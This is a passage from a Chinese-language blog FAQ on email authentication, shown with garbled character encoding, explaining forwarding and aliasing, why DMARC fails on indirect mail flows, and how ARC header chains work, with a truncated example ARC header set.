ä¸Šæ¨™ç±¤æˆ–æ˜¯éæ¿¾æ–‡å­—ã€‚</p>\n<p>å›åˆ°ä¸»é¡Œï¼Œæ ¹æ“š<a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">ç¶­åŸºç™¾ç§‘</a>ï¼Œç²—ç•¥å¯ä»¥å°‡ forwarding åˆ†æˆ Server-based forwarding è·Ÿ Client-based forwardingã€‚</p>\n<p>Client-based forwarding ï¼Œæˆ–ç¨± resendingï¼Œåˆèƒ½åˆ†æˆè‡ªå‹•å’Œæ‰‹å‹•ï¼Œè‡ªå‹•çš„ä¾‹å­æ˜¯æœ‰äº›æœƒè­°è»Ÿé«”æœƒå…è¨±å—é‚€è€…ä¿®æ”¹æ™‚é–“æˆ–æ˜¯æœƒè­°å…§å®¹ç­‰è³‡è¨Šï¼Œç„¶å¾Œè‡ªå‹•ä»¥ä¸»è¾¦è€…çš„åç¾©å†æ¬¡å¯„é€æˆ–æ›´æ–°é‚€è«‹çµ¦æ‰€æœ‰èˆ‡æœƒè€…ï¼Œæ­¤æ™‚å°±æœƒå°è‡´ <code>smtp.MailFrom</code> è·Ÿ <code>header.From</code> ä¸ç›¸ç­‰ã€‚æ‰‹å‹•çš„éƒ¨åˆ†å°±æ˜¯ä¸€èˆ¬äººåœ¨ MUA è£¡æœƒç”¨åˆ°çš„ä¿¡ä»¶è½‰ç™¼ï¼Œç•¶æˆ‘å€‘æ‰‹å‹•æŒ‰ä¸‹è½‰ç™¼ç®­é ­çš„æ™‚å€™ï¼ŒæœƒæŠŠåŸä¿¡ä»¶ inline åµŒå…¥åˆ°æ–°ä¿¡ä»¶è£¡ï¼Œä¸¦å®Œæ•´ä¿ç•™é™„ä»¶ä»¥åŠ <code>header.From</code>ã€<code>header.Reply-To</code> æ¬„ä½ã€‚ä¸Šè¿°å…©å€‹ä¾‹å­ä¸­ï¼Œå…¶å¯¦å¯„ä»¶äººï¼ˆ<code>smtp.MailFrom</code>ï¼‰å·²ç¶“ä¸æ˜¯åŸæœ¬çš„å¯„ä»¶äººäº†ï¼Œæ‰€ä»¥æ¯”èµ· forwarding é€™ç¨®è¡Œç‚ºæ›´æ¥è¿‘ remailingã€‚</p>\n<p>é‚£ Server-based forwarding æ˜¯ä»€éº¼å‘¢ï¼Ÿè¨±å¤š mail server æä¾›ä¸€å€‹åŠŸèƒ½ï¼Œè®“ä½ å¯ä»¥ä»»æ„å‰µå»ºä¿¡ç®±åœ°å€ï¼Œç„¶å¾Œé€£åˆ°ä½ è‡ªå·±æœ¬ä¾†æ“æœ‰çš„ä¿¡ç®±ï¼Œæ–¹ä¾¿ä¿¡ä»¶é›†ä¸­è™•ç†ã€‚é€™ç¨®æƒ…æ³åˆè¢«ç¨±ä½œ re-addressing æˆ– email aliasingï¼Œä¹Ÿå°±æ˜¯ä¿¡ç®±åˆ¥åï¼Œæ˜¯ä¸€ç¨®éå¸¸å¸¸è¦‹çš„æ‡‰ç”¨ã€‚</p>\n<p>æƒ…å¢ƒä¾‹å¦‚ï¼šç‚ºäº†è®“å®¢æˆ¶å¥½è¾¨èªï¼Œä½ çš„å…¬å¸ï¼ˆ<code>candies.com</code>ï¼‰ç‚ºä¸åŒç”¢å“å‰µå»ºäº†å¤šå€‹å®¢æœä¿¡ç®±ï¼ˆ<code>cookie@candies.com</code>ã€<code>chocolate@candies.com</code> ã€<code>gummies@candies.com</code>ï¼‰ï¼Œä¸éå› ç‚ºå…¬å¸åªæœ‰ä½ ä¸€å€‹å®¢æœï¼Œæ‰€ä»¥æ‰€æœ‰å¯„åˆ°é€™äº›ä¿¡ç®±çš„ä¿¡ä»¶å…¶å¯¦éƒ½æœƒè¢«å°åˆ°ä½ çš„å€‹äººä¿¡ç®±ï¼Œå¦‚ <code>jemmy88@gmail.com</code> æˆ–æ˜¯<code>jemmy01@outlook.com</code> ã€‚ ç•¶ç„¶ï¼Œè¦è¨­å®šæ•¸å€‹åˆ¥åä¹Ÿè¡Œï¼ˆä½ æœ‰æ–°çš„å®¢æœå¤¥ä¼´ä¸€èµ·è™•ç†ä¿¡ä»¶å•¦ï¼‰ï¼Œç¸½ä¹‹å¯ä»¥æƒ³æˆæ˜¯å‰µé€ ä¸€å€‹çµ±ä¸€å°å¤–çš„çª—å£ï¼Œé€²ä¾†å¾Œå†åˆ†ç™¼ã€‚æ—©æœŸçš„ sendmail å°±æ˜¯ç”¨ä¸€å€‹æª”æ¡ˆ <code>~/.forward</code> ä¾†è¨˜éŒ„é€™äº›ä¸€å°å¤šçš„ alias é—œä¿‚å†æ ¹æ“šé€™äº›è¦å‰‡é€²è¡Œ forwardingã€‚</p>\n<p>æˆ–è€…ï¼Œä½ è®€å¤§å­¸çš„æ™‚å€™æœ¬ä¾†æœ‰å€‹å­¸æ ¡ä¿¡ç®±ï¼Œç•¢æ¥­ä¹‹å¾Œæƒ³ç¹¼çºŒç¶­æŒé€™å€‹æ ¡å‹åœ°å€ï¼Œä½†å­¸æ ¡ä¸¦ä¸æƒ³è² æ“”ä¿¡ä»¶å„²å­˜çš„æˆæœ¬ï¼Œé€™æ™‚å°±èƒ½ç”¨åˆ¥åçš„æ–¹å¼è®“ä¿¡ç®±åœ°å€ä¾ç„¶å­˜åœ¨ï¼Œä¸éä¿¡ä»¶æ‰€æœ‰å¯„åˆ°æ ¡å‹ä¿¡ç®±çš„éƒµä»¶å°±æœƒè¢« forward åˆ°ä½ çš„å…¶ä»–ç§äººä¿¡ç®±ã€‚</p>\n<p>ä¸ç®¡å“ªå€‹ aliasing æƒ…å¢ƒï¼Œä¿¡ä»¶æœ¬èº«ï¼ˆ<code>header</code> è·Ÿ <code>body</code>ï¼‰è·Ÿä¿¡å°è¢‹ä¸Šçš„å¯„ä»¶äººï¼ˆ<code>smtp.MailFrom</code>ï¼‰éƒ½æ˜¯ä¸è®Šçš„ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œæ”¶ä¿¡äººçœ‹åˆ°çš„å…§æ–‡éƒ½æ˜¯åŸæ±åŸå‘³ï¼Œé»æ“Šå›è¦†çš„æ™‚å€™ä¹Ÿæ˜¯å›çµ¦å¯„ä»¶äººè€Œä¸æ˜¯ä¸­é–“ forwarding çš„ mail serverã€‚é›–ç„¶èµ°éå¿…ç•™ç—•è·¡ï¼Œforwarding ä¹Ÿæœƒåœ¨åŸå§‹ä¿¡ä»¶ä¸­çš„ trace è¢«è¨˜éŒ„ä¸‹ä¾†ï¼Œä½†å°±é›™æ–¹ end user æºé€šçš„è§’åº¦è€Œè¨€ï¼Œä¸­é–“é€™å±¤ forwarding å…¶å¯¦æ˜¯éš±å½¢çš„ã€‚</p>\n<hr>\n<h2 id=\"q3\"><a class=\"direct-link\" href=\"#q3\">#</a> Q3:ã€ä¸­ç¹¼ email server ã€ä¹Ÿæåˆ°å¾ˆå¤šæ¬¡è€¶ï¼Œä»–æ˜¯å“ªäº›æƒ…æ³æœƒå‡ºç¾ï¼Ÿæœ‰å¯èƒ½æ˜¯ä»»æ„ domain ï¼ˆå°±æ˜¯è·Ÿæ”¶ä»¶è€…è·Ÿå¯„ä»¶è€…æœ¬èº«éƒ½æ²’ä»€éº¼é—œä¿‚ï¼‰å—ï¼Ÿ</h2>\n<p>é€™å€‹å•é¡Œçš„è©³ç´°å›ç­”å¯ä»¥çœ‹çœ‹ä¸Šé¢çš„ Q2ï¼Œã€ä¸­ç¹¼ email server ã€æ˜¯æˆ‘æ•˜è¿°ä¸­æ¯”è¼ƒé€šä¿—çš„ç”¨èªï¼ŒæŒ‡çš„æ˜¯å¯„ä¿¡æ–¹è·Ÿæœ€çµ‚æ”¶ä¿¡æ–¹ä¸­é–“çš„ hopï¼Œåœ¨ RFC å®šç¾©ä¸­è¼ƒç‚ºæ­£å¼çš„åå­—æ˜¯ <strong>mediator</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸­é–“äººã€‚</p>\n<p>mediator å…¶å¯¦ä¸èƒ½èªªæ˜¯ä¸€å° serverï¼Œè€Œæ˜¯ã€æä¾› reposting çš„è¤‡åˆå¼è§’è‰²ã€ï¼Œå®ƒæ¶µè“‹äº† MTA çš„ relay åŠŸèƒ½ã€MUA çš„æ’°å¯«ä¿¡ä»¶åŠŸèƒ½ã€ä»¥åŠ MDA çš„åœ°å€æŸ¥è©¢åŠŸèƒ½ã€‚mediator ä¹Ÿä¸¦éæ˜¯å›ºå®šçš„è§’è‰²ï¼Œä¾‹å¦‚ä¸€å°ä¿¡å¾ A çš„ mail server å¯„åˆ° B çš„ mail serverï¼Œç„¶å¾Œ B å†æŠŠä¿¡è½‰ç™¼åˆ° C mail serverï¼Œå° A è·Ÿ B è€Œè¨€é€™å°ä¿¡æ²’æœ‰ç¶“éä»»ä½• mediatorï¼Œä½†å° C è€Œè¨€ B çš„ mail server å°±æ‰®æ¼”äº† mediator çš„è§’è‰²ã€‚</p>\n<p>å›åˆ°å•é¡Œï¼Œmediator å¯ä»¥æ˜¯å¤–éƒ¨ã€ç¬¬ä¸‰æ–¹çš„æœå‹™ï¼Œæ‰€ä»¥ç•¶ç„¶å¯èƒ½æ˜¯è·Ÿæ”¶ä»¶è€…å¯„ä»¶è€…ç„¡é—œçš„ domainã€‚</p>\n<hr>\n<h2 id=\"q4\"><a class=\"direct-link\" href=\"#q4\">#</a> Q4: <code>smtp.MailFrom</code> è·Ÿ <code>header.From</code> å¯ä»¥ä¸åŒï¼Œç„¶å¾Œ alignment åˆä¸éï¼Œé‚£ DMARCÂ ä¸å°±å¤±æ•—å—ï¼Ÿ</h2>\n<p>æ˜¯çš„ï¼å…¶å¯¦ DMARC æœƒå¤±æ•—çš„æƒ…æ³éå¸¸å¤šï¼Œç”šè‡³é‚„å‡ºäº†ä¸€å€‹ <a href=\"https://datatracker.ietf.org/doc/html/rfc7960\">RFC7960</a> ï¼ˆInteroperability Issues between Domain-based Message Authentication,<br>\nÂ Reporting, and Conformance (DMARC) and Indirect Email Flowsï¼‰è¨è«–å‘¢ï¼</p>\n<p>Indirect Email Flows å°±æ˜¯é–“æ¥çš„å¯„ä¿¡æ–¹å¼ï¼ŒåŒ…å«å‰é¢ forwarding æéçš„ alias è·Ÿ mailing listï¼Œé‚„æœ‰å¾ˆå¤šæœ‰è¶£çš„æ¡ˆä¾‹ï¼š</p>\n<ul>\n<li>ç•¶ MUA å˜—è©¦ä»¥åˆ¥äººçš„èº«ä»½å¯„ä¿¡ï¼šæœ‰äº›æ–°èæˆ–æ˜¯é›œèªŒç¶²ç«™æœƒæœ‰ â€œforward-to-friendâ€ åŠŸèƒ½ï¼Œæˆ–æ˜¯æœ‰äº›æœƒæœ‰ â€œsend-asâ€ åŠŸèƒ½ã€‚</li>\n<li>æœ‰äº› IoT æˆ–åµŒå…¥å¼è¨­å‚™æœƒç”¨ hardcoded domain å¯„ä¿¡ï¼Œæˆ–æ˜¯ä»¥ device owner èº«ä»½å¯„ä¿¡</li>\n<li>æœ‰äº› MTA å¯èƒ½æœƒä¿®æ”¹ä¿¡ä»¶å…§æ–‡çš„ encoding æˆ–æ˜¯ header çš„æ¬„ä½ï¼ˆä¾‹å¦‚æ—¥æœŸæ ¼å¼ï¼‰ï¼Œé€ æˆ DKIM é©—è­‰éŒ¯èª¤</li>\n<li>MDA ä¹Ÿå¯èƒ½æœƒåœ¨éæ¿¾æ™‚ä½¿ç”¨ä¸€äº›ä¿®æ”¹ä¿¡ä»¶çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ä½¿ç”¨ <code>add_header()</code> è·Ÿ <code>delete_header()</code> ç­‰å‡½å¼</li>\n</ul>\n<p>ä»¥ä¸Šéƒ½æ˜¯åˆç†æ‡‰ç”¨ç¯„åœä½†æ˜¯ DMARC ä¸æ”¯æ´çš„æƒ…å¢ƒï¼Œåªè¦æ˜¯æœ‰ç¶“é mediator è½‰é”æˆ–æ˜¯æœ‰ä¿®æ”¹åˆ°ä¿¡ä»¶å…§å®¹ï¼Œè¦å˜›é©—è­‰ä¸éè¦å˜› alignment ä¸éï¼Œå¹¾ä¹éƒ½æœƒè®“ DMARC å¤±æ•—ã€‚å°¤å…¶å¤§å®¶å¦‚æœéƒ½æœ‰å¥½å¥½è¨­ç½®æˆ <code>p=reject</code> æ›´æ˜¯ä¸€é»è½‰åœœé¤˜åœ°éƒ½æ²’æœ‰äº†ã€‚</p>\n<hr>\n<h2 id=\"q5\"><a class=\"direct-link\" href=\"#q5\">#</a> Q5: æ‰¿ä¸Šï¼Œé‚£ä¹‹å‰æåˆ°çš„ ARCÂ æ€éº¼è§£é€™å€‹å•é¡Œï¼Ÿ</h2>\n<p><strong>ARCï¼ˆAuthenticated Received Chainï¼‰</strong> çš„å®—æ—¨å°±æ˜¯ç‚ºäº†è§£æ±º Indirect Email Flow çš„å•é¡Œï¼Œè©¦åœ–åŠ ä¸Šæ›´å¤šé©—è­‰è³‡è¨Šè®“æœ¬ä¾†æº–å‚™ä¸Ÿæ‰ DMARC å¤±æ•—çš„ä¿¡çš„ MDA èƒ½é‡æ–°è€ƒæ…®ã€é€šèä¸€ä¸‹ã€‚</p>\n<p>ARC åœ¨ 2019 å¹´æ‰æˆç‚º RFC ä¸Šçš„æ–‡ä»¶ï¼Œä»å±¬å¯¦é©—æ€§è³ªï¼ˆexperimentalï¼‰ï¼Œå› æ­¤ç›®å‰æœ‰å¯¦ä½œèˆ‡æ”¯æ´çš„å» å•†ä¹Ÿä¸å¤šï¼Œåœ¨æˆ‘è¼ƒç†ŸçŸ¥çš„ç¯„åœè£¡åªæœ‰æœ€å¤§çš„ Gmail è·Ÿ Microsoft Office 365ã€‚</p>\n<h3 id=\"%E5%8E%9F%E7%90%86\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%90%86\">#</a> åŸç†</h3>\n<p>å›æƒ³ä¸€ä¸‹éœ€è¦ ARC çš„æœ€å¤§åŸå› ï¼Œå°±æ˜¯å› ç‚ºç¶“é mediator çš„éç¨‹ä¸­ç™¼ç”Ÿä¿¡ä»¶çš„ä¿®æ”¹æ›´å‹•æˆ–æ˜¯ä¾†æºä¸åŒï¼Œæ‰€ä»¥å°è‡´æ”¶ä¿¡æ–¹èªç‚ºè‡ªå·±æ‹¿åˆ°çš„ã€å·²ç¶“ä¸æ˜¯åŸæœ¬çš„ä¿¡ä»¶ã€ã€‚ä½†é€™æ¨£å¤šå†¤æ‰å‘€ï¼Œä¿¡ä»¶ç¶“é mediator ä¹‹å‰éƒ½æ˜¯åˆæ³•çš„ï¼Œä½†æœ€çµ‚æ˜¯å¦èƒ½è¢«æ”¶åˆ°å»åªä»¥æ”¶ä¿¡æ–¹çš„ DMARC é©—è­‰ç‚ºä¸»ï¼Œé€™å°±åƒæ˜¯ä½ å¾å°ç£ç¶“éæ—¥æœ¬è½‰æ©Ÿåˆ°ç¾åœ‹ï¼Œç¾åœ‹æµ·é—œå»æ‰“æ­»èªç‚ºä½ ä¸€å®šæ˜¯æ—¥æœ¬äººä¸€æ¨£è’è¬¬å•Šï¼</p>\n<p>æ‰€ä»¥è¿½æ ¹ç©¶åº•ï¼Œåªè¦èƒ½å¤ è­‰æ˜ã€ç¶“é mediator å‰çš„åŸå§‹ä¿¡ä»¶ã€è·Ÿã€mediator æ›´å‹•çš„éƒ¨åˆ†ã€éƒ½æ˜¯åˆæ³•çš„ï¼Œé‚£å°±æ²’æœ‰ç–‘æ…®äº†å§ï¼Ÿ</p>\n<p>å› æ­¤ ARC çš„é‹ä½œæ–¹å¼ï¼Œå°±æ˜¯è®“æ¯ä¸€å€‹ mediator åœ¨ç¶“æ‰‹ä¿¡ä»¶æ™‚å°ä¿¡ä»¶åšä¸€æ¬¡ DMARC é©—è­‰ï¼Œä¸¦å°‡é©—è­‰çµæœã€å…ˆå‰æ‰€æœ‰ hop çš„ ARC é©—è­‰çµæœã€ä»¥åŠè‡ªå·±åšçš„ä¿®æ”¹ç°½åï¼Œé™„åœ¨ä¿¡å°è¢‹ä¸Šä½œç‚ºæ“”ä¿ã€‚æ¯ä¸€å€‹æ“”ä¿çš„å…§å®¹éƒ½æ¥çºŒè‘—ä¹‹å‰ç¶“éçš„ mediator çš„æ“”ä¿ï¼Œå› æ­¤æœƒæ§‹æˆä¸€æ¢éˆï¼ˆAuthenticated Received <strong>Chain</strong>ï¼‰ï¼Œå‡è¨­éˆä¸Šçš„æ¯å€‹ mediator éƒ½å€¼å¾—ä¿¡ä»»ï¼Œé‚£åˆç†æ¨è«–ä¹Ÿå¯ä»¥ç›¸ä¿¡ä»–å€‘æ‰€åšçš„ DMARC é©—è­‰çµæœå§ï¼é€™æ¨£ç•¶æœ€å¾Œçš„çµ‚ç«¯æ”¶ä¿¡ mail server è‡ªå·±åŸ·è¡Œ DMARC é©—è­‰å¤±æ•—æ™‚ï¼Œå°±å¯ä»¥é€é ARC ç™¼ç¾ã€å•Šï¼ŒåŸä¾†åŸå§‹ä¿¡ä»¶æœ‰é€šé DMARCï¼Œåªæ˜¯ä¸­é–“ç¶“éäº†é€™äº›ä¿®æ”¹æ‰€ä»¥ä¸ä¸€æ¨£äº†å‘€ã€ã€‚</p>\n<p>é€™å€‹ã€é™„åœ¨ä¿¡å°è¢‹ä¸Šçš„æ“”ä¿ã€å°±æ˜¯ <strong>ARC Set</strong>ï¼Œæ˜¯åŒ…å«ä¸‹é¢ä¸‰å€‹ ARC header çš„ä¸€çµ„ç´€éŒ„ã€‚</p>\n<ul>\n<li>ARC-Authentication-Results (AAR)ï¼šã€æˆ‘åšçš„ DMARC è·Ÿ ARC é©—è­‰ã€ã€‚ç´€éŒ„æ­¤æ¬¡ DMARC é©—è­‰çš„çµæœä»¥åŠå…ˆå‰æ¯ä¸€çµ„ ARC Set é©—è­‰çš„çµæœã€‚</li>\n<li>ARC-Message-Signature (AMS)ï¼šã€æˆ‘æ›´å‹•çš„éƒ¨åˆ†ä¸¦ç½²åã€ã€‚é¡ä¼¼ DKIM Signature çš„ç°½ç« ï¼Œå…§å®¹åŒ…å«åŸå§‹ä¿¡ä»¶çš„å„ç¨® header è·Ÿ DKIM Signatureï¼Œé‚„æœ‰æ–°å¢æˆ–æ˜¯æ›´å‹•çš„ headerã€‚</li>\n<li>ARC-Seal (AS)ï¼šã€æˆ‘æ ¸å¯ä¿¡ä¸Šæ‰€æœ‰çš„ ARC Set ä¸¦ç½²åã€ã€‚é¡ä¼¼ DKIM Signature çš„ç°½ç« ï¼Œå…§å®¹åŒ…å«æ”¶åˆ°ä¿¡ä»¶æ™‚å·²ç¶“ç´€éŒ„çš„æ‰€æœ‰ ARC Set ä»¥åŠå‰›å‰›æ–°åŠ çš„ AAR è·Ÿ AMSã€‚</li>\n</ul>\n<p>ARC-Seal çš„æ„ç¾©æ˜¯ä»€éº¼å‘¢ï¼Ÿå¤§å®¶å¯èƒ½æœ‰ç¶“é©—ï¼Œå¦‚æœå»éŠ€è¡Œæˆ–æ˜¯å…¬å®¶å–®ä½è¾¦äº‹æƒ…ï¼Œåœ¨å¡«æ–‡ä»¶çš„æ™‚å€™å¯«éŒ¯äº†ï¼Œæœ‰éœ€è¦å¡—æ”¹çš„åœ°æ–¹æˆ–æ˜¯æ–°å¢çš„å‚™è¨»ï¼Œæœƒè«‹ä½ åœ¨æ–°çš„è³‡æ–™ä¸Šè“‹è‡ªå·±çš„å°ç« ä»¥èŒ²è­‰æ˜ã€‚ARC-Seal çš„æ¦‚å¿µå°±æ˜¯åœ¨å±¤å±¤å°ç« å°ä¸Šå†æŠ¼ä¸Šè‡ªå·±çš„åå­—ï¼Œä»¥ç¤ºã€æˆ‘æ ¸å¯äº†éå»çš„é€™ä¸€ä¸²ç°½åï¼Œç•¶ç„¶é‚„æœ‰æˆ‘è‡ªå·±çš„éƒ¨åˆ†ã€ã€‚</p>\n<h3 id=\"%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\">#</a> ä¾†å€‹ç¯„ä¾‹</h3>\n<p>ä¸‹é¢æ˜¯ä¸€å°åŸå§‹ä¿¡ä»¶çš„ ARC Setã€‚æ‰€æœ‰çš„ header éƒ½æ˜¯ç”¨ stack çš„æ–¹å¼ç´€éŒ„ï¼Œæ‰€ä»¥æœ€å…ˆåŠ çš„æ˜¯ç´«è‰²çš„ AAR ï¼Œå†ä¾†æ˜¯è—è‰²çš„ AMSï¼Œæœ€å¾Œæ˜¯ç´…è‰²çš„ ASã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-extra/arc-set.png\" /><figcaption><p>ARC set from <a href=\"http://onedegree.hk\">onedegree.hk</a> to gmail</p>\n</figcaption></figure></p>\n<p>é¦–å…ˆå¯ä»¥æ³¨æ„åˆ°çš„æ˜¯ï¼Œä¸‰å€‹ header ä¸­éƒ½ç”±ä¸€æ¨£çš„ <code>i</code> æ¨™ç±¤é–‹å§‹ï¼Œé€™æ˜¯ä¸€å€‹é¡ä¼¼ nonceã€counterã€æˆ– ID çš„æ•¸å­—ï¼Œä»£è¡¨æ˜¯ç¬¬å¹¾å€‹ç¶“éçš„ mediatorï¼Œå¾ 1 é–‹å§‹ç´¯åŠ ã€‚ æ‰€ä»¥å‡è¨­æˆ‘æ˜¯æ”¶åˆ°ä¸Šé¢é€™å°ä¿¡çš„ mediatorï¼Œæˆ‘è¦æ–°å¢çš„ ARC Set å°±éƒ½æœƒæ¨™ç¤º <code>i=2</code>ã€‚</p>\n<p>å†ä¾†åˆ†åˆ¥çœ‹çœ‹å„å€‹ headerã€‚ç´«è‰²çš„ AAR å°±æ˜¯ä¸€èˆ¬çš„ DMARC é©—è­‰çµæœï¼Œå¯ä»¥çœ‹åˆ°æœ€å¾Œæ˜¯ <code>pass</code>ã€‚è—è‰²çš„ AMS å¹¾ä¹è·Ÿ DKIM Signature ä¸€æ¨£ï¼Œæ·¡è—è‰²çš„æ¡†æ˜¯æ–°å¢çš„ headerï¼Œæœ€æœ«æ˜¯åŸå§‹ä¿¡ä»¶çš„ DKIM Signatureã€‚ç´…è‰²çš„ AS ä¹Ÿé¡ä¼¼é¡ä¼¼ DKIM Signatureï¼Œä½†åªç°½ ARC Set æ‰€ä»¥æ²’æœ‰ <code>h</code>ã€<code>bh</code> ç­‰æ¨™ç±¤ã€‚</p>\n<p>æœ€é‡è¦çš„æ˜¯ <code>cv</code> ï¼Œä»£è¡¨ <strong>C</strong>hain <strong>V</strong>alidation Statusï¼Œä¹Ÿå°±æ˜¯é€™æ¢éˆçš„é©—è­‰çµæœã€‚æ¯ä¸€å€‹ mediator çš„ <code>cv</code>æœƒæ ¹æ“šå‰ä¸€å€‹ mediator ç´€éŒ„çš„ <code>cv</code> ä»¥åŠå„å€‹ ARC Set çš„é©—è­‰çµæœæ±ºå®šã€‚ç•¶ä¸€å€‹ mediator å¾—å‡º fail çš„çµè«–ï¼Œä»–å°±æœƒåœæ­¢æ¼”ç®—æ³•ä¸¦æ¨™è¨˜ <code>cv=fail</code>ï¼Œä¸”åŠ å…¥çš„ AS åªæœƒç°½ç½²ç•¶å‰æ–°å¢çš„ ARC Setï¼Œç­‰åŒæ‰“æ–·é€™æ¢éˆä¸¦å°‡ç™¼ç”ŸéŒ¯èª¤çš„ ARC Set è¦–ç‚ºå”¯ä¸€ä¸€çµ„ ARC Setã€‚æ­¤å¾Œçš„ mediator ä¸€çœ‹åˆ° <code>cv=fail</code> å°±æœƒåœä¸‹ä¸åšä»»ä½•é©—è­‰ï¼Œä¹Ÿä¸æœƒæ–°å¢ ARC Setã€‚</p>\n<p>å› ç‚ºåœ–ä¸­æ˜¯ç¬¬ä¸€å€‹ mediatorï¼ˆ<code>i=1</code>ï¼‰æ‰€ä»¥ <code>cv=none</code>ï¼Œç•¢ç«Ÿéˆæ­£è¦é–‹å§‹ç•¶ç„¶æ²’æœ‰æ±è¥¿å¯ä»¥åš Validationã€‚ å¦å¤–é€™è£¡æ²’æœ‰æ¨™ç¤ºï¼Œä½†æ˜¯å¾ŒçºŒçš„ AAR æœƒæœ‰ä¸€å€‹ <code>arc=</code> çš„æ¨™ç±¤ï¼Œæœƒæ ¹æ“šå…ˆå‰æ¯å€‹ ARC Set ä¸­çš„ AMS è·Ÿ AS åšé©—è­‰ï¼Œç¢ºä¿éˆçš„å®Œæ•´æ€§æ²’æœ‰è¢«ç ´å£ã€‚</p>\n<p>ä¾‹å¦‚ä¸‹åœ–ï¼ˆå–è‡ª RFC ï¼‰å°±æ˜¯ç¶“éä¸‰å€‹ mediator çš„æƒ…æ³ï¼Œåªçœ‹è¢å…‰å­—çš„ <code>arc=</code>ï¼Œä½ æœƒç™¼ç¾ <code>i=2</code> çš„ mediator é©—è­‰äº† <code>i=1</code> çš„ AMS è·Ÿ ASï¼Œç„¶å¾Œ <code>i=3</code> çš„ mediator é©—è­‰äº† <code>i=1,2</code> çš„ AMS è·Ÿ ASã€‚</p>\n<p>ä½ å¯èƒ½æœƒç–‘å•ï¼Œç‚ºä»€éº¼åœ¨ <code>i=3</code> çš„ mediator é‚£è£¡æœ‰ä¸€å€‹ <code>fail</code> é‚„æ˜¯å¾—å‡º <code>arc=pass</code> çš„çµè«–å‘¢ï¼Ÿ</p>\n<p>å› ç‚º <code>i=2</code> çš„ mediator å°ä¿¡ä»¶é€²è¡Œäº†ä¿®æ”¹ï¼Œæ‰€ä»¥åˆ° <code>i=3</code> çš„ mediator é€™è£¡æ™‚ä¿¡ä»¶çš„ hash å·²ç¶“ä¸ç¬¦åˆ <code>ams.1</code> è§£å¯†å¾Œçš„çµæœäº†ã€‚ä½†æ˜¯å› ç‚ºç¬¦åˆ <code>ams.2</code>ï¼Œæ‰€ä»¥å¯ä»¥æ¨è«–ä¿¡ä»¶é™¤äº† <code>i=2</code> çš„ mediator ä¹‹å¤–æ²’æœ‰è¢«å…¶ä»–äººå‹•éã€‚æ—¢ç„¶å‰ä¸€å€‹ <code>ams.2</code> è·Ÿæ‰€æœ‰çš„ <code>as</code> éƒ½éäº†ï¼Œé€™æ¢éˆæ˜¯æ²’æœ‰å•é¡Œçš„ï¼Œçµ¦ <code>cv=pass</code>ï¼</p>\n<pre class=\"language-text\"><code class=\"language-text\"><span class=\"highlight-line\">ARC-Seal: i=3; a=rsa-sha256; cv=pass; d=clochette.example.org; </span><br><span class=\"highlight-line\">    s=clochette; t=12345;b=CU87XzXlNlk5X/yW4l73UvPUcP9ivwYWxyBWc  </span><br><span class=\"highlight-line\">    VrRs7+HPx3K05nJhny2fvymbReAmOA9GTH/y+k9kEc59hAKVg==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=3; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    clochette.example.org; h=message-id:date:from:to:subject; s=  </span><br><span class=\"highlight-line\">    clochette; t=12345;bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZY  </span><br><span class=\"highlight-line\">    LQ=;b=o71vwyLsK+Wm4cOSlirXoRwzEvi0vqIjd/2/GkYFYlSd/GGfKzkAgPqx  </span><br><span class=\"highlight-line\">    fK7ccBMP7Zjb/mpeggswHjEMS8x5NQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=3; clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.2.gmail.example=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.1.lists.example.org=fail (message has been altered))  </mark><br><span class=\"highlight-line\">Authentication-Results: clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><span class=\"highlight-line\">    arc=pass (as.2.gmail.example=pass,  </span><br><span class=\"highlight-line\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </span><br><span class=\"highlight-line\">    ams.1.lists.example.org=fail (message has been altered))  </span><br><span class=\"highlight-line\">ARC-Seal: i=2; a=rsa-sha256; cv=pass; d=gmail.example; s=20120806;  </span><br><span class=\"highlight-line\">    t=12345; b=Zpukh/kJL4Q7Kv391FKwTepgS56dgHIcdhhJZjsalhqkFIQ  </span><br><span class=\"highlight-line\">    QAJ4T9BE8jjLXWpRNuh81yqnT1/jHn086RwezGw==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    gmail.example; h=message-id:date:from:to:subject;s=20120806;   </span><br><span class=\"highlight-line\">    t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYLQ=;  </span><br><span class=\"highlight-line\">    b=CVoG44cVZvoSs2mMig2wwqPaJ4OZS5XGMCegWqQs1wvRZJS894tJM0xO1  </span><br><span class=\"highlight-line\">    RJLgCPsBOxdA59WSqI9s9DfyKDfWg==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=2; gmail.example; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@example.org; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.1.lists.example.org=pass, ams.1.lists.example.org=pass)  </mark><br><span class=\"highlight-line\">ARC-Seal: i=1; a=rsa-sha256; cv=none; d=lists.example.org; s=dk-   </span><br><span class=\"highlight-line\">    lists; t=12345; 